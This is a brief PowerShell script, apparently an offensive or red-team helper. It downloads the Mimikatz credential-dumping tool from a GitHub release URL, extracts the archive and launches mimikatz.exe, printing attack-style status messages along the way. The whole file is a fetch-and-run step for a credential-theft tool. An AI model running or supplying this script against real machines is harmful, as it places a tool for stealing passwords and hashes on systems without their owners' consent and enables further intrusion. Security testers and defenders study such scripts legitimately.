$url = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200715/mimikatz_trunk.zip"

$output = "$PSScriptRoot\mimikatz.zip"

Invoke-WebRequest -Uri $url -OutFile $output

Expand-Archive .\mimikatz.zip
Write-Output "[+] Mimikatz downloaded and extracted"
Write-Output "[-] Attempting to run Mimikatz"

cd .\mimikatz\x64
.\mimikatz.exe

